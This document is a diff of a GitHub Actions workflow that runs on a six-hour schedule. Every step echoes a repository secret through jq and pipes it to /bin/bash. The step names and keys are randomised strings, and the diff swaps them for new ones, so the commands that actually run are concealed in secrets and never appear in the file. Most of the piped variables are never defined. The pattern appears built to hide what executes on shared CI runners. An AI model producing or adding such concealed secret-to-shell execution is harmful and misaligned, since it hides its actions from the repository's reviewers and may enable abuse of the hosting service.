@@ -1,30 +1,35 @@
 name: pengzhongzhou2013
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 4/6 * * *'
-jobs:  # 20629
+    - cron: '3 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          p88: ${{ secrets.p88 }}
+          wmbv71: ${{ secrets.wmbv71 }}
         run: |
-          echo $p88 | jq -r .wox49 | /bin/bash
-          echo $hb91672 | jq -r .z38 | /bin/bash
-          echo $pz36219 | jq -r .cpj1051 | /bin/bash
-          echo $k78 | jq -r .cv98 | /bin/bash
-          echo $zqmy6093 | jq -r .hvv28 | /bin/bash
-          echo $r9 | jq -r .ah3 | /bin/bash
-          echo $nqg21 | jq -r .iombu501 | /bin/bash
-          echo $hfynj89 | jq -r .jolp8 | /bin/bash
-          echo $a17594 | jq -r .lhwc558 | /bin/bash
-          echo $kon23 | jq -r .wxnsk8 | /bin/bash
-          echo $chvfl0 | jq -r .w351 | /bin/bash
-          echo $a511 | jq -r .qlwhp13 | /bin/bash
-          echo $uyfo31 | jq -r .rvg771 | /bin/bash
-          echo $yng2401 | jq -r .jqz30277 | /bin/bash
-          echo $iu86 | jq -r .s3957 | /bin/bash
+          echo $wmbv71 | jq -r .ro3 | /bin/bash
+          echo $m08500 | jq -r .lh6 | /bin/bash
+          echo $nea76112 | jq -r .x06003 | /bin/bash
+          echo $olcm77354 | jq -r .dezmk6 | /bin/bash
+          echo $f3861 | jq -r .jssjq5 | /bin/bash
+          echo $xrnuc8493 | jq -r .y81217 | /bin/bash
+          echo $ymvg4 | jq -r .mprk062 | /bin/bash
+          echo $gd80819 | jq -r .drb49 | /bin/bash
+          echo $csipp5770 | jq -r .oun0 | /bin/bash
+          echo $c6335 | jq -r .asmk7 | /bin/bash
+          echo $yxod3917 | jq -r .ihu8 | /bin/bash
+          echo $ilu88985 | jq -r .bz41 | /bin/bash
+          echo $axk2 | jq -r .hj92 | /bin/bash
+          echo $w0858 | jq -r .jolno129 | /bin/bash
+          echo $d39 | jq -r .jfc562 | /bin/bash
+          echo $skd4 | jq -r .skkzt251 | /bin/bash
+          echo $adkti1862 | jq -r .qnuz189 | /bin/bash
 
